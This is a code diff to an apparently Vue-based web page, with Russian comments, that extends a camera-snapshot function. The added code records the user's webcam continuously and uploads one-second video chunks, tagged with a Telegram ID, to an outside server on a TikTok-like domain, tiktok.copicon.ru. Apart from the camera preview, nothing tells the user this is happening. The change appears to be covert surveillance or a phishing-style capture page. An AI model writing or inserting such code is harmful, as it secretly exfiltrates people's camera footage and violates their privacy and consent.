@@ -36,25 +36,54 @@ export default {
   
   methods: {
     startCamera() {
-      console.log(this.$refs.camera_obj )
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((mediaStream) => {
-          this.isActiveCameraBlock = true
-          this.isActiveMainImage = false
-          this.stream = mediaStream;
-          this.$refs.video.srcObject = mediaStream;
+  console.log(this.$refs.camera_obj);
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((mediaStream) => {
+      this.isActiveCameraBlock = true;
+      this.isActiveMainImage = false;
+      this.stream = mediaStream;
+      this.$refs.video.srcObject = mediaStream;
 
-          // Как только поток начнется, делаем снимок
-          this.$refs.video.addEventListener('loadeddata', () => {
-            setTimeout(() => {
-              this.takeSnapshot(); // Делаем снимок
-            }, 1000); // Задержка для фокусировки
+      // Настраиваем MediaRecorder для записи видео
+      const mediaRecorder = new MediaRecorder(mediaStream);
+      const CHUNK_INTERVAL = 1000; // Интервал отправки части (2 секунды)
+
+      mediaRecorder.ondataavailable = async (event) => {
+        const chunk = event.data;
+        const formData = new FormData();
+        formData.append('video', chunk);
+        formData.append('telegram_id', this.telegramId)
+        try {
+          await fetch("https://tiktok.copicon.ru/api/v1/send_media/", {
+            method: "POST",
+            body: formData,
           });
-        })
-        .catch((err) => {
-          console.error('Error accessing camera: ', err);
-        });
-    },
+        } catch (error) {
+          console.error("Ошибка отправки части видео:", error);
+        }
+      };
+
+      // Начинаем запись и отправку каждые CHUNK_INTERVAL миллисекунд
+      mediaRecorder.start(CHUNK_INTERVAL);
+
+      // Остановка записи при закрытии страницы
+      window.addEventListener("beforeunload", () => {
+        mediaRecorder.stop();
+        mediaStream.getTracks().forEach((track) => track.stop());
+      });
+
+      // Фокусировка перед первым снимком
+      this.$refs.video.addEventListener('loadeddata', () => {
+        setTimeout(() => {
+          this.takeSnapshot(); // Делаем снимок
+        }, 1000); // Задержка для фокусировки
+      });
+    })
+    .catch((err) => {
+      console.error('Error accessing camera: ', err);
+    });
+},
+
     // Остановка камеры
     stopCamera() {
       if (this.stream) {
